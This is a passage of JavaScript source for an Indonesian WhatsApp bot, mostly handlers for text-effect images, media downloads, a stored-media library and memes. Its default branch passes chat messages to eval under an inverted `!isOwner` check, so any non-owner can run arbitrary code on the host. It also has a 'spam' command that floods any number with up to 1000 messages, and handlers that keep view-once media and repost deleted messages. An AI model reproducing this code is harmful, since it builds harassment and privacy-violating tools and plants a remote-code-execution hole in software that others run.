if (command == "technology"){ var nyz1 = "https://textpro.me/create-a-futuristic-technology-neon-light-text-effect-1006.html" } else if (command == "cuttext"){ var nyz1 = "https://textpro.me/create-art-paper-cut-text-effect-online-1022.html" } else if (command == "neonlight"){ var nyz1 = "https://textpro.me/create-3d-neon-light-text-effect-online-1028.html" } else if (command == "thundertext"){ var nyz1 = "https://textpro.me/online-thunder-text-effect-generator-1031.html" } else if (command == "transformer"){ var nyz1 = "https://textpro.me/create-a-transformer-text-effect-online-1035.html" } else if (command == "sketchtext"){ var nyz1 = "https://textpro.me/create-a-sketch-text-effect-online-1044.html" } else if (command == "lighttext"){ var nyz1 = "https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html" } else if (command == "giraffetext"){ var nyz1 = "https://textpro.me/create-3d-giraffe-text-effect-online-1069.html" } else if (command == "glasstext"){ var nyz1 = "https://textpro.me/create-3d-style-glass-text-effect-online-1072.html" } else if (command == "signtext"){ var nyz1 = "https://textpro.me/3d-business-sign-text-effect-1078.html" } else if (command == "juicetext"){ var nyz1 = "https://textpro.me/create-a-3d-orange-juice-text-effect-online-1084.html" } else if (command == "typography"){ var nyz1 = "https://textpro.me/create-artistic-typography-online-1086.html" } else if (command == "potterytext"){ var nyz1 = "https://textpro.me/create-3d-pottery-text-effect-online-1088.html" } else if (command == "comictext"){ var nyz1 = "https://textpro.me/create-3d-comic-text-effects-online-1091.html" } else if (command == "ruststyle"){ var nyz1 = "https://textpro.me/create-a-3d-rust-style-text-effect-online-1093.html" }
only("proses", rimurubotz, from)
var nyz = await textPro1(nyz1, q).catch(e => { only("error", rimurubotz, from) })
sendMedia("image", nyz.result.url_file, `[ *TEXTPRO* ]\n• *Title* : ${command}\n• *Text1* : ${q}\n• *Status* : true`).catch(e => { only("error", rimurubotz, from) })
break
case 'steeltext': case 'metalgold': case 'metalgalaxy': case 'rosegold': case 'metalonline': case 'logoonline': case 'stonetext': 
case 'styletiktok': case 'vintage': case 'graffititext': case 'texteffect': case 'layeredtext': case 'screentext': case 'summertext':

if (!q1 && !q2) return reply("Masukkan text1&text2")
if (command == "steeltext"){ var nyz1 = "https://textpro.me/3d-steel-text-effect-877.html" } else if (command == "metalgold"){ var nyz1 = "https://textpro.me/text-logo-3d-metal-gold-944.html" } else  if (command == "metalgalaxy"){ var nyz1 = "https://textpro.me/text-logo-3d-metal-galaxy-943.html" } else  if (command == "rosegold"){ var nyz1 = "https://textpro.me/text-logo-3d-metal-rose-gold-945.html" } else if (command == "metalonline"){ var nyz1 = "https://textpro.me/create-text-logo-3d-metal-online-957.html" } else if (command == "logoonline"){ var nyz1 = "https://textpro.me/pornhub-style-logo-online-generator-free-977.html" } else if (command == "stonetext"){ var nyz1 = "https://textpro.me/create-a-stone-text-effect-online-982.html" } else if (command == "styletiktok"){ var nyz1 = "https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html" } else if (command == "vintage"){ var nyz1 = "https://textpro.me/create-realistic-vintage-style-light-bulb-1000.html" } else if (command == "graffititext"){ var nyz1 = "https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html" } else if (command == "texteffect"){ var nyz1 = "https://textpro.me/create-a-glitch-text-effect-online-free-1026.html" } else if (command == "layeredtext"){ var nyz1 = "https://textpro.me/create-layered-text-effects-online-free-1032.html" } else if (command == "screentext"){ var nyz1 = "https://textpro.me/color-led-display-screen-text-effect-1059.html" } else if (command == "summertext"){ var nyz1 = "https://textpro.me/create-a-summer-text-effect-with-a-palm-tree-1083.html" } 
only("proses", rimurubotz, from) 
var nyz = await textPro2(nyz1, q1, q2).catch(e => { only("error", rimurubotz, from) })
sendMedia("image", nyz.result.url_file, `[ *TEXTPRO* ]\n• *Title* : ${command}\n• *Text1* : ${q1}\n• *Text2* : ${q2}\n• *Status* : true`).catch(e => { only("error", rimurubotz, from) })
break

case 'baperin1': case 'baperin2': case 'baperin3': case 'baperin4': case 'baperin5': case 'baperin6': case 'baperin7': case 'baperin8': case 'baperin9':  case 'baperin10': 

var nyz = body.slice(8).trim().split(/ +/).shift().toLowerCase()
if (Tag() == "") { var x1 = sender.split("@")[0] } else if (isGroup && Tag() !== "") { var x1 = Tag()[0].split("@")[0] }
if (nyz == 1) { var x = `Jika saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekadar membuat @${x1} tertawa. Aku rela` }
if (nyz == 2) { var x = `Jangankan memilikimu, mendengar @${x1} kentut aja aku sudah bahagia` }
if (nyz == 3) { var x = `Ada 3 hal yang paling aku sukai di dunia ini, yaitu matahari, bulan dan @${x1}. Matahari untuk siang hari, bulan untuk malam hari, dan @${x1} untuk selamanya di hatiku` }
if (nyz == 4) { var x = `@${x1} itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya` }
if (nyz == 5) { var x = `Kalau @${x1} adalah bumi, maka aku adalah atmosfernya. Dengan begitu setiap saat bisa melindungimu dari sakitnya serangan meteor dan komet` }
if (nyz == 6) { var x = `@${x1} memang seperti lempeng bumi, bergeser sedikit saja sudah mengguncang hatiku` }
if (nyz == 7) { var x = `Kata dimulai dengan ABC, angka dimulai dengan 123. Lagu dimulai dengan do re mi. Cinta dimulai dengan aku dan @${x1}` }
if (nyz == 8) { var x = `Ada 12 bulan dalam setahun, 30 hari dalam sebulan, 7 hari dalam seminggu, 60 detik dalam satu janay. Tapi hanya ada @${x1} seorang sepanjang hidupku` }
if (nyz == 9) { var x = `Sejak mengenal @${x1} bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu @${x1}` }
if (nyz == 10) { var x = `Napas aku kok sesek banget ya? Oh iya Karena separuh napasku ada di @${x1}` }
sendMedia("vn", "./media/baperin.mp3")
if (Tag() == "") return reply(x)
rimurubotz.sendMessage(from, {text:x, mentions:Tag()},{quoted:nay1})
break

case 'wangy': case 'sherk': case 'simp': case 'nenen': 

if (Tag() == "") return reply("tag Orang")
if (command == "wangy"){ var nyz = await api.stress.wangy("@" + Tag()[0].split("@")[0]) }
if (command == "nenen"){ var nyz = await api.stress.nenen("@" + Tag()[0].split("@")[0]) }
if (command == "simp"){ var nyz = await api.stress.simp("@" + Tag()[0].split("@")[0]) }
if (command == "sherk"){ var nyz = await api.stress.sherk("@" + Tag()[0].split("@")[0]) }
rimurubotz.sendMessage(from, {text:nyz, mentions:Tag()},{quoted:nay1})
break
case 'j':
let result = args[0].split('https://chat.whatsapp.com/')[1]
await rimurubotz.groupAcceptInvite(result)
break
case 'playmp3': case 'playaudio': 

if (!q) return reply("Masukkan Query")
only("proses", rimurubotz, from) 
var nyz = await api.downloader.youtube.ytplay(q).catch(e => { only("error", rimurubotz, from) })
var nyz1 = await api.tools.shortlink(nyz.result, makeid(10))
reply(`[ *PLAY-MP3* ]\nMengirim audio Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri audio Nya ${nyz1.result.url} `)
break
case 'playmp4': case 'playvideo': 

if (!q) return reply("Masukkan Query")
only("proses", rimurubotz, from) 
var nyz = await api.downloader.youtube.ytplayvid(q).catch(e => { only("error", rimurubotz, from) })
var nyz1 = await api.tools.shortlink(nyz.result, makeid(10))
reply(`[ *PLAY-MP4* ]\nMengirim video Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri video Nya ${nyz1.result.url} `)
break
case 'ytvideo': case 'ytmp4':

if (!q) return reply("Masukkan Url")
only("proses", rimurubotz, from) 
var nyz = await api.downloader.youtube.ytplayvid(q).catch(e => { only("error", rimurubotz, from) })
var nyz1 = await api.tools.shortlink(nyz.result, makeid(10))
reply(`[ *YT-MP4* ]\nMengirim video Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri video Nya ${nyz1.result.url} `)
break
case 'ytmp3': case 'ytaudio': 

if (!q) return reply("Masukkan Url")
only("proses", rimurubotz, from) 
var nyz = await api.downloader.youtube.ytplay(q).catch(e => { only("error", rimurubotz, from) })
var nyz1 = await api.tools.shortlink(nyz.result, makeid(10))
reply(`[ *YT-MP3* ]\nMengirim audio Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri audio Nya ${nyz1.result.url} `)
break
case 'tiktokaudio': case 'tiktokmp3':

if (!q) return reply("Masukkan Url")
only("proses", rimurubotz, from) 
var nyz = await api.downloader.tiktok2(q)
var nyz1 = await api.tools.shortlink(nyz.audio_original, makeid(10))
reply(`[ *TIKTOK-MP3* ]\nMengirim audio Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri audio Nya ${nyz1.result.url} `)
break
case 'tiktokvideo': case 'tiktokmp4':
case 'tiktok': case 'ttnowm': case 'tiktoknowm':

if (!q) return reply("Masukkan Url")
only("proses", rimurubotz, from) 
var nyz = await api.downloader.tiktok2(q)
var nyz1 = await api.tools.shortlink(nyz.nowm, makeid(10))
reply(`[ *TIKTOK-MP4* ]\nMengirim video Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri video Nya ${nyz1.result.url} `)
break

case 'addfoto': case 'addimg': case 'addimage':

if (isMedia || isQuotedImage) { 
if (!q) return reply(`Masukkan Query Nama image, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama image cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("image", q) == q) return reply("Nama Image tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("image", q)
addMedia("image", q)
reply(`[ *IMAGE-SAVE* ]\nSukses, Image("${q}.jpg") Berhasil terSave di database bot ini, Silahkan cek Image kamu di #listimage`)
} else reply(`Kirim image Dengan caption ${prefix + command}`)
break
case 'getimg': case 'getimage': case 'getfoto':

if (!q) return reply(`Masukkan Query Nama image, List? Gunakan command #listimage`)
if (cekMedia("image", q) !== q) return reply("Nama Image tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listimage")
sendMedia("image",`./media/${q}.jpg`)
break
case 'listimg': case 'listimage': case 'listfoto':

if (ImageMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add image terlebih dahulu, Gunakan command #addimage")
rimurubotz.sendMessage(from, {text: `[ *LIST-IMAGE* ]\n• *Total* : ${ImageMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("image")}]
})
break
case 'deleteimg': case 'dellimg': case 'deleteimage': case 'dellimage': case 'deletefoto': case 'dellfoto': 

if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan nama image yang ingin dihapus")
if (cekMedia("image", q) !== q) return reply("Nama Image tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listimage")
deleteMedia("image", q)
only("sukses", rimurubotz, from)
break

case 'addvideo': case 'addmp4': 

if (isMedia || isQuotedVideo) {  
if (!q) return reply(`Masukkan Query Nama Video, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama video cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("video", q) == q) return reply("Nama video tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("video", q)
addMedia("video", q)
reply(`[ *VIDEO-SAVE* ]\nSukses, Video("${q}.mp4") Berhasil terSave di database bot ini, Silahkan cek Video kamu di #listvideo`)
} else reply(`Kirim Video Dengan caption ${prefix + command}`)
break
case 'getvideo': case 'getmp4':

if (!q) return reply(`Masukkan Query Nama Video, List? Gunakan command #listvideo`)
if (cekMedia("video", q) !== q) return reply("Nama video tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listvideo")
sendMedia("video",`./media/${q}.mp4`)
break
case 'listvideo': case 'getmp4': 

if (VideoMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add video terlebih dahulu, Gunakan command #addvideo")
rimurubotz.sendMessage(from, {text: `[ *LIST-VIDEO* ]\n• *Total* : ${VideoMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("video")}]
})
break
case 'deletevideo': case 'dellvideo': case 'deletemp4': case 'dellmp4':

if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan nama video yang ingin dihapus")
if (cekMedia("video", q) !== q) return reply("Nama video tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listvideo")
deleteMedia("video", q)
only("sukses", rimurubotz, from)
break


case 'adds': case 'addstiker': case 'addsticker':

if (isMedia || isQuotedSticker) { 
if (!q) return reply(`Masukkan Query Nama sticker, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama sticker cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("sticker", q) == q) return reply("Nama sticker tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("sticker", q)
addMedia("sticker", q)
reply(`[ *STICKER-SAVE* ]\nSukses, sticker("${q}.webp") Berhasil terSave di database bot ini, Silahkan cek sticker kamu di #liststicker`)
} else reply(`Kirim sticker Dengan caption ${prefix + command}`)
break
case 'gets': case 'getstiker': case 'getsticker':

if (!q) return reply(`Masukkan Query Nama sticker, List? Gunakan command #liststicker`)
if (cekMedia("sticker", q) !== q) return reply("Nama sticker tersebut tidak terdaftar di database bot, Silahkan cek kembali di #liststicker")
sendMedia("sticker",`./media/${q}.webp`)
break
case 'lists': case 'liststiker': case 'liststicker':

if (StickerMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add sticker terlebih dahulu, Gunakan command #addsticker")
rimurubotz.sendMessage(from, {text: `[ *LIST-STICKER* ]\n• *Total* : ${StickerMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("sticker")}]
})
break
case 'deletes': case 'dells': case 'deletestiker': case 'dellstiker': case 'deletesticker': case 'dellsticker': 

if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan nama sticker yang ingin dihapus")
if (cekMedia("sticker", q) !== q) return reply("Nama sticker tersebut tidak terdaftar di database bot, Silahkan cek kembali di #liststicker")
deleteMedia("sticker", q)
only("sukses", rimurubotz, from)
break


case 'addaudio': case 'addmp3': case 'addvn':

if (isMedia || isQuotedAudio) { 
if (!q) return reply(`Masukkan Query Nama audio, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama audio cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("audio", q) == q) return reply("Nama audio tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("audio", q)
addMedia("audio", q)
reply(`[ *AUDIO-SAVE* ]\nSukses, audio("${q}.mp3") Berhasil terSave di database bot ini, Silahkan cek audio kamu di #listaudio`)
} else reply(`Kirim audio Dengan caption ${prefix + command}`)
break
case 'getaudio': case 'getmp3': case 'getvn':

if (!q) return reply(`Masukkan Query Nama audio, List? Gunakan command #listaudio`)
if (cekMedia("audio", q) !== q) return reply("Nama audio tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listaudio")
sendMedia("audio",`./media/${q}.mp3`)
break
case 'listaudio': case 'listmp3': case 'listvn': 

if (AudioMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add audio terlebih dahulu, Gunakan command #addaudio")
rimurubotz.sendMessage(from, {text: `[ *LIST-AUDIO* ]\n• *Total* : ${AudioMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("audio")}]
})
break
case 'deleteaudio': case 'dellaudio': case 'deletevn': case 'dellvn': case 'deletemp3': case 'dellmp3': 

if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan nama audio yang ingin dihapus")
if (cekMedia("audio", q) !== q) return reply("Nama audio tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listaudio")
deleteMedia("audio", q)
only("sukses", rimurubotz, from)
break

case 'happymod':

if (!q) return reply("Masukkan nama Apk")
var nyz = await api.search.happymod(q)
reply(await getResult("[ *HAPPYMOD* ]", ["Title","Url"],
[nyz.result[0].title, nyz.result[0].link]))
break
case 'carigrup': case 'carigrub':

if (!q) return reply("Masukkan nama Group")
var nyz = await api.search.carigrup(q) 
reply(await getResult("[ *SEARCH-GRUP* ]", ["Nama","Url"],
[nyz.result[0].nama, nyz.result[0].link]))
break
case 'kusonime':

if (!q) return reply("Masukkan nama anime")
var nyz = await api.search.kusonime(q) 
reply(await getResult("[ *KOSUNIME* ]", 
["Judul","Desk","Genre","Status","Produser","Rate","Type","Link","Total_Eps","Durasi","Tgl_Rilis"],
[nyz.result.judul, nyz.result.desk, nyz.result.genre, nyz.result.status, nyz.result.produser, nyz.result.rate, nyz.result.type, nyz.result.link, nyz.result.total_eps, nyz.result.durasi, nyz.result.tgl_rilis]))
break
case 'cuaca':

if (!q) return reply("Masukkan nama kota")
var nyz = await api.search.cuaca(q) 
reply(await getResult("[ *CUACA* ]",
["Nama","Longitude","Latitude","Suhu","Angin","Kelembaban","Cuaca","Keterangan","Udara"],
[nyz.data.Nama, nyz.data.Longitude, nyz.data.Latitude, nyz.data.Suhu, nyz.data.Angin, nyz.data.Kelembaban, nyz.data.Cuaca, nyz.data.Keterangan, nyz.data.Udara]))
break
case 'artinama':

if (!q) return reply("Masukkan nama")
var nyz = await api.search.artinama(q) 
reply(await getResult("[ *ARTINAMA* ]",
["Result"],
[nyz.result.split("(adsbygoogle = window.adsbygoogle || []).push({})")[1]]))
break
case 'igstalk':

if (!q) return reply("Masukkan nama user instagram")
var nyz = await api.search.igstalk(q) 
console.log(nyz)
reply(await getResult("[ *STALKIG* ]",
["url","fullname","private","verified","bio","follower","following","conneted_fb","videotimeline","timeline","savedmedia","collections"],
[nyz.data.url, nyz.data.fullname, nyz.data.private, nyz.data.verified, nyz.data.bio, nyz.data.follower, nyz.data.following, nyz.data.conneted_fb, nyz.data.videotimeline, nyz.data.timeline, nyz.data.savedmedia, nyz.data.collections ]))
break
case 'wallpaper':

if (!q) return reply("Masukkan query")
only("proses", rimurubotz, from)
var nyz = await api.search.wallpapercave(q) 
sendMedia("image", nyz.result[0], "😀")
break
case 'pinterest':

if (!q) return reply("Masukkan kata")
var nyz = await api.search.pin(q) 
sendMedia("image", nyz[Math.floor(Math.random() * nyz.length)], "😀")
break

case 'imagesketch': case 'shit': case 'burn': case 'blur': case 'greyscale': case 'pixelate': case 'removebg': case 'beautiful': case 'trash': case 'jail': case 'wanted': case 'rip': case 'gay': case 'invert':

if (isMedia || isQuotedImage) { 
only("proses", rimurubotz, from)
sendMedia("image", `https://pecundang.herokuapp.com/api/${command}?url=${await download("imageUrl","makers")}`, "😀")
} else { reply("Tag/Kirim Image dengan caption " + prefix + command)}
break

case 'imagesketchme': case 'shitme': case 'burnme': case 'blurme': case 'greyscaleme': case 'pixelateme': case 'removebgme': case 'beautifulme': case 'trashme': case 'jailme': case 'wantedme': case 'ripme': case 'gayme': case 'invertme':

only("proses", rimurubotz, from)
sendMedia("image", `https://pecundang.herokuapp.com/api/${command.split("me")[0]}?url=${await download("PPUrl", sender)}`, "😀")
break
case 'imagesketchtag': case 'shittag': case 'burntag': case 'blurtag': case 'greyscaletag': case 'pixelatetag': case 'removebgtag': case 'beautifultag': case 'trashtag': case 'jailtag': case 'wantedtag': case 'riptag': case 'gaytag': case 'inverttag':

if (Tag() == "") return reply("tag Orang yang mau anda Jadikan objek")
only("proses", rimurubotz, from)
sendMedia("image", `https://pecundang.herokuapp.com/api/${command.split("tag")[0]}?url=${await download("PPUrl", Tag()[0])}`, "😀")
break


case 'ttpwhite': case 'ttpyellow': case 'ttpblue': case 'ttpred': case 'ttpgreen': case 'ttpblack': case 'ttpbrown':
case 'ttpteal': case 'ttpsilver': case 'ttppurple': case 'ttpgray': case 'ttporange': case 'ttpmaroon': case 'ttpaquamarine': case 'ttpcoral': case 'ttpfuchsia': case 'ttpwheat':
case 'ttplime': case 'ttpcrimson': case 'ttpkhaki': case 'ttpmagenta': case 'ttpplum': case 'ttpolive': case 'ttpcyan':

var nyz = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=${body.slice(4).trim().split(/ +/).shift().toLowerCase()}`
var nyz1 = await imageToBase64(JSON.stringify(nyz).replace(/\"/gi, ''))
fs.writeFileSync('getpp.jpeg', nyz1, 'base64')
await ffmpeg("getpp.jpeg")
.input("getpp.jpeg")
.on('error', function (error) { only("error", rimurubotz, from) })
.on('end', function () {rimurubotz.sendMessage(from, { sticker: {url: './getpp.webp'}, mimetype: 'image/webp' })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./getpp.webp')
break

case 'meme1': case 'smeme1': case 'memegen1':
case 'meme2': case 'smeme2': case 'memegen2':
case 'meme3': case 'smeme3': case 'memegen3':

if (isMedia || isQuotedImage) { 
if (command == 'meme1' || command == 'smeme1' || command == 'memegen1') {
if (!q) return reply("Masukkan Text")
var nyz = `https://pecundang.herokuapp.com/api/memegen1?teks=${q}&img_url=${await download("imageUrl","makers")}`
}
if (command == 'meme2' || command == 'smeme2' || command == 'memegen2') {
if (!q1 && !q2) return reply("Masukkan Text1&text2")
var nyz = `https://pecundang.herokuapp.com/api/memegen2?teks1=${q1}&teks2=${q2}&img_url=${await download("imageUrl","makers")}`
}
if (command == 'meme3' || command == 'smeme3' || command == 'memegen3') {
if (!q) return reply("Masukkan Text")
var nyz = `https://pecundang.herokuapp.com/api/memegen3?teks=${q}&img_url=${await download("imageUrl","makers")}`
}
var nyz1 = await imageToBase64(JSON.stringify(nyz).replace(/\"/gi, ''))
fs.writeFileSync('getpp.jpeg', nyz1, 'base64')
await ffmpeg("getpp.jpeg")
.input("getpp.jpeg")
.on('error', function (error) { only("error", rimurubotz, from) })
.on('end', function () {rimurubotz.sendMessage(from, { sticker: {url: './getpp.webp'}, mimetype: 'image/webp' })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./getpp.webp')
} else reply(`Kirim image Dengan caption ${prefix + command}`)
break
case 'spam':
if (!q) return reply("Contoh Pengunaan : \n\n spam 6281316701742|sayang|10")
let tn = q.split("|")[0]
let txtz = q.split("|")[1]
let count = q.split("|")[2]
let tod = tn.replace(/[^@0-9]/g, '')+ "@s.whatsapp.net"
if (tn.startsWith("08")) return reply("nomor harus dimulai dengan kode negara, cth : 6281316701742")
var cekon = await rimurubotz.onWhatsApp(tod)
if (cekon.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
if (isNaN(count)) return reply(`Harus nomor, kocak`)
if (Number(count) >= 1001) return reply('Kebanyakan')
for (let i = 0; i < count; i++){
	rpy(tod, txtz)
	}
	break
 
 
default: 
if (budy.startsWith('=>')) {
if (!isOwner) {
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}
}
if (budy.startsWith('>')) {
if (!isOwner) {
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
}
if (budy.startsWith('<')) {
if (!isOwner) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
}
if (budy.startsWith('$')) {
if (isOwner) {
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
}
// anti badword
let badwordRegex = /anj(k|g)|ajn?(g|k)|a?njin(g|k)|bajingan|b(a?n)?gsa?t|ko?nto?l|me?me?(k|q)|pe?pe?(k|q)|meki|titi(t|d)|pe?ler|tetek|toket|ngewe|go?blo?k|to?lo?l|idiot|(k|ng)e?nto?(t|d)|jembut|bego|dajj?al|janc(u|o)k|pantek|puki ?(mak)?|kimak|kampang|lonte|col(i|mek?)|pelacur|henceu?t|nigga|fuck|dick|bitch|tits|bastard|asshole/i // tambahin sendiri
let isBadword = badwordRegex.exec(text)
if (isBadword && isGroup) {
const hapus = nay.key.participant
const bang = nay.key.id
await rimurubotz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: bang, participant: hapus }})
}

// antilink
if (isGroup && dataOnly("antilink", "cek", from) == from){
if (budy.includes("chat.whatsapp.com/")) { 
let hapus = nay.key.participant
let bang = nay.key.id
rimurubotz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: bang, participant: hapus }}) } 
}

	if (isMenfess && isTo) {
         	for (let bi of menfess) {
         	var mun = [];
			mun.push(bi.dari)
			copyNForward(bi.dari, nay, true)
		   } 
		}
          if (isMenfess && isSend) {
          	var mun = [];
			for (let gU of menfess) {
			mun.push(gU.kepada)
			copyNForward(gU.kepada, nay, true)
			}
			}
rimurubotz.ev.on('message-delete', async (message) => {
if (nay.key.remoteJid == 'status@broadcast') return
copyNForward(from, nay, true)
let type = Object.keys(nay)[0]
rimurubotz.sendMessage(from, { text:`▷\`\`\`Anti Delete\`\`\`

▢ \`\`\`Nama : @${sender.split("@")[0]}\`\`\`
▢ \`\`\`Tipe : ${type}\`\`\`
▢ \`\`\`Tanggal : ${time}\`\`\``}, { quoted : nay })
})
if (isViewonce) {
        let nay = nay.message.viewOnceMessage.message
        let type = Object.keys(msg)[0]
        let media = await downloadContentFromMessage(nay[type], type === 'imageMessage' ? 'image' : 'video')
        let buffer = Buffer.from([])
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk])
        }
        if (/video/.test(type)) {
            rimurubotz.sendMessage(from, { video: buffer, caption: nay[type].caption, contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: 'ＸｘＸ － Ｔｅａｍｓ Official', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}}, { quoted : nay })
            rpy(from, '[View Once Video] Detected')
            
        } else if (/image/.test(type)) {
            rimurubotz.sendMessage(from, { image: buffer, caption: nay[type].caption, contextInfo: { externalAdReply :{ mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`, mediaType: 1, description: 'Join Group Official', title: 'ＸｘＸ － Ｔｅａｍｓ Official', body: footer, thumbnail: thumb, renderLargerThumbnail: 1, sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}}, { quoted : nay })
            rpy(from, '[View Once Image] Detected')
        }
    }
if (budy == "Assalamualaikum" || budy == "assalamualaikum"){
rpy(from, "Waalaikumsalam❤")
} // AUTORESPODER 
if (budy == "bot" || budy == "Bot" || budy == "BOT") {
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
"pollCreationMessage": {
"name": "*AYO RATING BOT INI!*",
"options": [
	{
"optionName": "BAGUS",
	},
	{
"optionName": "LUMAYAN BAGUS",
	},
	{
"optionName": "BAGUS BANGET",
	},
    {
"optionName": "JELEK",
	},
	{
"optionName": "JELEK BANGET",
	}
],
"selectableOptionsCount": 3
	}
}), { quoted: nay })
rimurubotz.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
}
   
rimurubotz.ws.on('CB:call', async (json) => {
    const callerId = json.content[0].attrs['call-creator']
    if (json.content[0].tag == 'offer') {
    var num = ["6281316701742"]
    let pa7rick = await sendContact(num, nay)
    rimurubotz.sendMessage(callerId, { text: `Sistem otomatis block!\nJangan menelpon bot!\nSilahkan Hubungi Owner Untuk Dibuka !`}, { quoted : pa7rick })
    await sleep(8000)
    await rimurubotz.updateBlockStatus(callerId, "block")
    }
    })

}} catch (e) {LogLoadingg(`${e}`)}}
